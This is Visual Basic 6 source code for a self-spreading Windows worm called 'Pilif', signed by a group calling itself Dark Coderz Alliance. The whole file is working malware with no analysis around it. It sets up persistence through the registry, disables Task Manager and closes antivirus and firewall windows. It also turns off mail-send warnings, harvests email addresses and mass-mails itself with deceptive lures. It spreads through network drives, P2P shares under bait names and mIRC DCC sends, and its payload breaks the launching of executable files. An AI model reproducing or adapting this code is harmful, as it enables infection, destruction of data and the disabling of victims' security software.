   VERSION 5.00
   Begin VB.Form frmMain
      BorderStyle     =   0  'None
      ClientHeight    =   90
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   90
      Icon            =   "frmMain.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   90
      ScaleWidth      =   90
      StartUpPosition =   3  'Windows Default
      Begin VB.Timer RetroChk
         Enabled         =   0   'False
         Interval        =   10000
         Left            =   0
         Top             =   120
      End
   End
   Attribute VB_Name = "frmMain"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   '================================================
   '|  Pilif ... [JOS CeNzurA]!                    |
   '|  Rott_En | Dark Coderz Alliance              |
   '|  Manifesto for the human right of expression |
   '|  No more censore!                            |
   '================================================
   Private Declare Function FindWindow Lib "user32" _
        Alias "FindWindowA" _
        (ByVal lpClassName As String, _
        ByVal lpWindowName As String) As Long

   Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" ( _
        ByVal hwndOwner As Long, _
        ByVal nFolder As Long, _
        pidl As ITEMIDLIST) As Long

   Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" ( _
        ByVal pidl As Long, _
        ByVal pszPath As String) As Long

   Private Declare Function MAPILogoff Lib "MAPI32.DLL" ( _
        ByVal Session&, _
        ByVal UIParam&, _
        ByVal Flags&, _
        ByVal Reserved&) As Long

   Private Declare Function MAPILogon Lib "MAPI32.DLL" ( _
        ByVal UIParam&, _
        ByVal User$, _
        ByVal Password$, _
        ByVal Flags&, _
        ByVal Reserved&, _
        Session&) As Long

   Private Declare Function MAPISendMail Lib "MAPI32.DLL" Alias "BMAPISendMail" ( _
        ByVal Session&, _
        ByVal UIParam&, _
        Message As MAPIMessage, _
        Recipient() As MapiRecip, _
        file() As MapiFile, _
        ByVal Flags&, _
        ByVal Reserved&) As Long

   Private Const MAPI_TO = 1
   Private Const MAPI_NEW_SESSION = &H2
   Private Const SUCCESS_SUCCESS = 0
   Private Const CSIDL_TIF = &H20

   Private Type MAPIMessage
       Reserved As Long
       subject As String
       NoteText As String
       MessageType As String
       DateReceived As String
       ConversationID As String
       Flags As Long
       RecipCount As Long
       FileCount As Long
   End Type

   Private Type MapiRecip
       Reserved As Long
       RecipClass As Long
       Name As String
       Address As String
       EIDSize As Long
       EntryID As String
   End Type

   Private Type MapiFile
       Reserved As Long
       Flags As Long
       Position As Long
       PathName As String
       FileName As String
       FileType As String
   End Type

   Private Type SHITEMID
   cb As Long
   abID As Byte
   End Type

   Private Type ITEMIDLIST
   mkid As SHITEMID
   End Type

   Private Declare Function PostMessage Lib "user32" _
        Alias "PostMessageA" _
        (ByVal hwnd As Long, _
        ByVal wMsg As Long, _
        ByVal wParam As Long, _
        ByVal lParam As Long) As Long
   Const WM_CLOSE = &H10

   Dim a, b As Long
   Dim M1, M2, M3
   Dim MAttach(0) As MapiFile, MailMsg As MAPIMessage, Recip(0) As MapiRecip

   Private Sub Form_Load()
   Counter = GetSetting("Reg", 0, "Run")
   Counter = Val(Counter) + 1
   SaveSetting "Reg", 0, "Run", Counter
   If Counter = 10 Then
   MsgBox Chr(34) & "Only two things are infinite : The Universe and Human Stupidity. And I am not sure about the Universe - A.Einstein" & Chr(34), vbInformation, "System Notice"
   SaveSetting "Reg", 0, "Run", ""
   End If
   Call Engine
   End Sub

   Private Sub Engine()
   Dim duser As String

   App.TaskVisible = False
   Me.Visible = False
   PilifF = App.EXEName & ".exe"
   PilifP = App.path
   If Right(PilifP, 1) <> "\" Then PilifP = PilifP & "\"
   Source = PilifP & PilifF
   If App.PrevInstance = True Then
   End
   End If
   If FileExist(GetSysDir & "\" & Chr(80) + Chr(73) + Chr(76) + Chr(73) + Chr(70) + Chr(46) + Chr(69) + Chr(88) + Chr(69)) Then 'pilif.exe
   GoTo exist
   Else
   FileCopy Source, GetSysDir + "\" + Chr(80) + Chr(73) + Chr(76) + Chr(73) + Chr(70) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
   End If
   exist:

   Dim Reg As Object
   Set Reg = CreateObject("wscript.shell")
   Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\" & "Pilif", GetSysDir + "\" + Chr(80) + Chr(73) + Chr(76) + Chr(73) + Chr(70) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
   duser = Reg.Regread("HKEY_CURRENT_USER\Identities\Default User ID")
   Reg.RegWrite "HKEY_CURRENT_USER\Identities\" & duser & "\Software\Microsoft\Outlook Express\5.0\Mail\" & "Warn on Mapi Send", "0x0"

   Call DisableTask
   Call Retro
   RetroChk.Enabled = True
   Call LAN
   Call MassMail
   Call P2P
   Call IRC
   Call Payload
   End Sub

   Private Sub DisableTask()
       Open "c:\dtask.reg" For Output As #1
       Print #1, "Windows Registry Editor Version 5.00"
       Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]"
       Print #1, """DisableTaskMgr""" & "=dword:00000001"
       Close #1
       Shell ("regedit /s c:\dtask.reg")
       Kill "c:\dtask.reg"
   End Sub

   Private Sub LAN()
       On Error Resume Next
       Set L1 = CreateObject("WScript.Network")
       Set L2 = L1.EnumNetworkDrives
       If L2.Count <> 0 Then
           For L3 = 0 To L2.Count - 1
               If InStr(L2.Item(L3), "\") <> 0 Then
               fso.Copyfile Source, L2.Item(L3), Chr(80) + Chr(73) + Chr(76) + Chr(73) + Chr(70) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
               End If
           Next
       End If
   End Sub

   Private Sub MassMail()
   On Error Resume Next
   Dim RetValue As Long, MapiSession As Long
   Dim Msg(1 To 10), subj(1 To 10), Attach(1 To 10)
   Dim addresses As String

   Msg(1) = "Important legal notice!" & vbCrLf & _
   "Do not delete this message. Analyse attachement and reply" & vbCrLf & _
   "as soon as possible with manifesto details." & vbCrLf & _
   "Thank you!"
   Msg(2) = "Please help us to save the right of freedom of expression!" & vbCrLf & _
   "All details will be displayed in small attached file. Good luck and thank you."
   Msg(3) = "You personal manifesto details are attached. Take good care of them!"
   Msg(4) = "Help us gather online votes for our anti-censore manifesto" & vbCrLf & _
   "We need you help now! Attachement will automatically send a vote to our" & vbCrLf & _
   "online database once you run it and will be redirected to our webpage!" & vbCrLf & _
   "Thank you!"
   Msg(5) = "Its curious, its scandalous... dont be so furious!" & vbCrLf & _
   "Life is bitch so dont take it serious."
   Msg(6) = "Please help us be free! We need the basic right of expression." & vbCrLf & _
   "Enable an online vote for our manifesto with the help of the attachement." & vbCrLf & _
   "Many thanks!"
   Msg(7) = "Music is beeing censored, journalists are afraid, law has not been" & vbCrLf & _
   "respected for long time. Why? Because of corruption and lack of right of" & vbCrLf & _
   "expression. Help us! Enable the attachement and our voting system will" & vbCrLf & _
   "track and record you help. Many thanks!"
   Msg(8) = "Parazitii need your help for the anti-censore campaign! See all details" & vbCrLf & _
   "in the attachement. Thank you!"
   Msg(9) = "Its just hip-hop. Nothing else. Enjoy!" & vbcrl & _
   "Oh yeah! one more thing: its a censore-related manifesto :)"
   Msg(10) = "This is my manifesto. You can stop this individual," & vbCrLf & _
   "but you can't stop us all...after all,we're all alike."

   subj(1) = "manifesto"
   subj(2) = "pilif"
   subj(3) = "sustain cause"
   subj(4) = "details"
   subj(5) = "attachement"
   subj(6) = "request"
   subj(7) = "Parazitii"
   subj(8) = "JOS CeNzurA"
   subj(9) = "freedom"
   subj(10) = "stolen rights"

   Attach(1) = "Details"
   Attach(2) = "Manifesto anti pilif"
   Attach(3) = "Manifesto details"
   Attach(4) = "Freedom of expression"
   Attach(5) = "Simple solution"
   Attach(6) = "attachement"
   Attach(7) = "Goverment issue"
   Attach(8) = "JOS CeNzurA"
   Attach(9) = "Parazitii"
   Attach(10) = "Pilif"

   vext(1) = ".exe"
   vext(2) = ".scr"
   vext(3) = ".pif"
   vext(4) = ".bat"
   vext(5) = ".com"
   vext(6) = ".cmd"

   RetValue = MAPILogon(0, "", "", MAPI_NEW_SESSION, 0, MapiSession)
   If RetValue <> SUCCESS_SUCCESS Then Exit Sub

   ScanMail GetSpecialfolder(CSIDL_TIF)
   Open GetSysDir & "\" & "adrbook" For Input As #1
   Line Input #1, addresses
   Close #1

   DoEvents
   Randomize Timer
   RndNr1 = (Int(Rnd * 10) + 1)
   RndNr2 = (Int(Rnd * 6) + 1)

   MAttach(0).PathName = GetSysDir + "\" + Chr(80) + Chr(73) + Chr(76) + Chr(73) + Chr(70) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
   MAttach(0).Reserved = 0
   MAttach(0).FileName = Attach(RndNr1) & vext(RndNr2)
   MAttach(0).Position = -1
   MailMsg.NoteText = Msg(RndNr)
   MailMsg.FileCount = 1
   MailMsg.Reserved = 0
   MailMsg.subject = subj(RndNr)
   MailMsg.RecipCount = 1
   Recip(0).Reserved = 0
   Recip(0).RecipClass = MAPI_TO
   Recip(0).Name = addresses
   RetValue = MAPISendMail(MapiSession, 0, MailMsg, Recip, MAttach, 0, &O0)
   RetValue = MAPILogoff(MapiSession, 0, 0, 0)
   End Sub

   Private Sub P2P()
   Dim GetSysDir As String
   GetSysDir = Environ("getsysdir")

   vname(1) = "Norton 2004 crack"
   vname(2) = "Kasperky AV Universal Key"
   vname(3) = "Dark Coderz Alliance"
   vname(4) = "Anti-hacker Utility"
   vname(5) = "Cracks mega warez collection"
   vname(6) = "Sex - totally free porn"
   vname(7) = "Easy credit card validation"
   vname(8) = "Yahoo hacker"
   vname(9) = "Webmail official hacker"
   vname(10) = "Free porn sites accounts"

   vext(1) = ".exe"
   vext(2) = ".scr"
   vext(3) = ".pif"
   vext(4) = ".bat"
   vext(5) = ".com"
   vext(6) = ".cmd"

   Randomize
   nr1 = Int(Rnd * 10) + 1
   nr2 = Int(Rnd * 6) + 1
   RndFile = vname(nr1) & vext(nr2)

   PilifF = App.EXEName & ".exe"
   PilifP = App.path
   If Right(PilifP, 1) <> "\" Then PilifP = PilifP & "\"
   Source = PilifP & PilifF

   Set WS = CreateObject("WScript.Shell")
   Set fso = CreateObject("SCripting.FileSystemObject")
   GetProg = WS.Regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")

   If FileExist(GetProg & "\KMD\Shared Folder") Then
   FileCopy Source, GetProg & "\KMD\Shared Folder" & "\" & RndFile
   Call EKazaa
   ElseIf FileExist(GetProg & "\Kazaa\My Shared Folder") Then
   FileCopy Source, GetProg & "\Kazaa\My Shared Folder\" & RndFile
   Call EKazaa
   ElseIf FileExist(GetProg & "\Morpheus\My Shared Folder") Then
   FileCopy Source, GetProg & "\Morpheus\My Shared Folder\" & RndFile
   Call EMorph
   ElseIf FileExist(GetProg & "\Grokster\My Grokster") Then
   FileCopy Source, GetProg & "\Grokster\My Grokster\" & RndFile
   ElseIf FileExist(GetProg & "\BearShare\Shared") Then
   FileCopy Source, GetProg & "\BearShare\Shared\" & RndFile
   ElseIf FileExist(GetProg & "\Edonkey2000\Incoming") Then
   FileCopy Source, GetProg & "\Edonkey2000\Incoming\" & RndFile
   ElseIf FileExist(GetProg & "\limewire\Shared") Then
   FileCopy Source, GetProg & "\limewire\Shared\" & RndFile
   ElseIf FileExist(GetProg & "\Shareaza\downloads") Then
   FileCopy Source, GetProg & "Shareaza\downloads" & RndFile
   ElseIf FileExist(GetProg & "\icq\shared files\") Then
   FileCopy Source, GetProg & "\icq\shared files\" & RndFile
   ElseIf FileExist(GetProg & "\WinMX\my shared folder\") Then
   FileCopy Source, GetProg & "\WinMX\my shared folder\" & RndFile
   Else
   End If
   End Sub

   Private Sub EKazaa()
   Set MyKey2 = CreateObject("WScript.Shell")
   Set fso = CreateObject("SCripting.FileSystemObject")
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\LocalContent\DisableSharing", 0, "REG_DWORD"
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\virus_filter", 0, "REG_DWORD"
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\bogus_filter", 0, "REG_DWORD"
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\bogus_filter", 0, "REG_DWORD"
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter\bogus_filter", 0, "REG_DWORD"
   MyKey2.RegWrite "HKEY_CURRENT_USER\Software\Kazaa\UserDetails\AutoConnected", 1, "REG_DWORD"
   End Sub

   Private Sub EMorph()
   Set MyKey3 = CreateObject("WSScript.Shell")
   Set fso = CreateObject("SCripting.FileSystemObject")
   MyKey3.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Morpheus\LocalContent\DisableSharing", 0, "REG_DWORD"
   MyKey3.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Morpheus\ResultsFilter\virus_filter", 0, "REG_DWORD"
   MyKey3.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Morpheus\ResultsFilter\bogus_filter", 0, "REG_DWORD"
   MyKey3.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Morpheus\ResultsFilter\firewall_filter", 0, "REG_DWORD"
   MyKey3.RegWrite "HKEY_USERS\.DEFAULT\SOFTWARE\Morpheus\UserDetails\AutoConnected", 0, "REG_DWORD"
   End Sub

   Private Sub IRC()
   On Error Resume Next
   Dim prog As String
   PilifF = App.EXEName & ".exe"
   PilifP = App.path
   If Right(PilifP, 1) <> "\" Then PilifP = PilifP & "\"
   Source = PilifP & PilifF
   If FileExist("c:\mirc\") Then
   prog = "c:\mirc\"
   ElseIf FileExist("c:\mirc32\") Then
   prog = "c:\mirc\32"
   ElseIf FileExist(GetProg & "\mirc\") Then
   prog = GetProg & "\mirc\"
   ElseIf FileExist(GetProg & "\mirc32\") Then
   prog = GetProg & "\mirc32\"
   Else
   GoTo quitirc
   End If
   FileCopy Source, prog & "Manifesto Anti Censore Pilif.txt.exe"
   Open prog & "\Script.ini" For Output As 1
   Print #1, "n1= on 1:JOIN:#:{"
   Print #1, "n2= /if ( $nick != $me ) {"
   Print #1, "n3= /msg $nick DCA are fighting for free speech. Get their manifesto now!"
   Print #1, "n4= /dcc send -c $nick " & pdir & "\Manifesto Anti Censore Pilif.txt.exe"
   Print #1, "n5= }"
   Close 1
   quitirc:
   End Sub

   Private Sub RetroChk_Timer()
   Call Retro
   End Sub

   Private Sub Retro()
   AV(1) = "Kaspersky Anti-Virus"
   AV(2) = "Kaspersky AV Control Centre"
   AV(3) = "Agnitium Firewall"
   AV(4) = "Kaspersky AV Monitor"
   AV(5) = "Kaspersky Anti-Virus Scanner"
   AV(6) = "McAfee"
   AV(7) = "Norton Anti-Virus"
   AV(8) = "Norton Firewall"
   AV(9) = "Sygate Personal Firewall"
   AV(10) = "Windows Updater"
   AV(12) = "Zone Alarm"
   AV(13) = "Kasperky Anti-Virus Personal"
   For i = LBound(AV) To UBound(AV)
   a = FindWindow(vbNullString, AV(i))
   b = PostMessage(a, WM_CLOSE, vbNull, vbNull)
   Next
   End Sub

   Private Sub Payload()
   Dim Reg As Object

   If Day(Now) > 25 Then
   frmPayload.Show
   Set Reg = CreateObject("wscript.shell")
   Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open\command\", ""
   Else
   End If

   If Day(Now) = 6 And Month(Now) = 4 Then
   MsgBox "Happy birthday Ombladon! Fuck you Pilif...", vbExclamation, "Pilif"
   End If

   End Sub

   Sub ScanMail(dir)
   On Error Resume Next
   Dim fso, ssfh, filh, s, f, d, q, a, textline
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ssfh = fso.GetFolder(dir).SubFolders
   For Each filh In ssfh
   ScanDir filh
   Next
   End Sub

   Sub ScanDir(dir)
   On Error Resume Next
   Dim fso, ssfh, filh, s, f, d, q, a, textline
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ssfh = fso.GetFolder(dir).SubFolders
   For Each filh In ssfh
   DoEvents
   ddd = ddd & filh & "/"
   Next
   arr1 = Split(ddd, "/")
   For Each sdir In arr1
   If sdir = "" Then Exit For
   aaa = aaa & CScan(sdir)
   Next sdir
   Open GetSysDir & "\" & "adrbook" For Output As #1
   Print #1, aaa
   Close #1
   Open GetSysDir & "\" & "adrbook" For Input As #1
   Do While Not EOF(1)
   Line Input #1, textline
   q = q & textline
   Loop
   Close #1
   q = Replace(q, "A#?@;", "")
   q = Replace(q, "A#?$;", "")
   Open GetSysDir & "\" & "adrbook" For Output As #1
   Print #1, q
   Close #1
   End Sub

   Function CScan(dir)
   Dim fso, cfh, filh, ext, textline, q, wwww
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set cfh = fso.GetFolder(dir).Files
   For Each filh In cfh
   DoEvents
   ext = fso.GetExtensionName(filh.path)
   ext = LCase(ext)
   If (ext = "htm") Or (ext = "html") Then
   aaaa = aaaa & FormatStr(filh.path)
   End If
   Next
   CScan = aaaa
   End Function

   Function FormatStr(gggg As String)
   Dim j As Long, cnt As Long, q As String, mlto As String, wwww As String
   Open gggg For Input As #1
   Do While Not EOF(1)
   Line Input #1, textline
   q = q & textline
   Loop
   Close #1
   For j = 1 To Len(q)
   If Mid(q, j, 8) = """" & "mailto:" Then
   mlto = ""
   cnt = 0
   Do While Mid(q, j + 8 + cnt, 1) <> """"
   mlto = mlto + Mid(q, j + 8 + cnt, 1)
   cnt = cnt + 1
   Loop
   If InStr(1, mlto, "@") Then
   Else
   mlto = "A#?@"
   End If
   If InStr(1, mlto, "?") Then
   mlto = "A#?$"
   End If
   mlto = Trim(mlto)
   wwww = wwww & mlto & ";"
   End If
   Next
   FormatStr = wwww
   End Function

   Private Function GetSpecialfolder(CSIDL As Long) As String
   Dim r As Long
   Dim IDL As ITEMIDLIST
   Dim path As String
   r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
   If r = 0 Then
   path$ = Space$(512)
   r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)
   GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)
   Exit Function
   End If
   GetSpecialfolder = ""
   End Function
   '================================================
   '|  Pilif ... [JOS CeNzurA]!                    |
   '|  Rott_En | Dark Coderz Alliance              |
   '|  Manifesto for the human right of expression |
   '|  No more censore!                            |
   '================================================
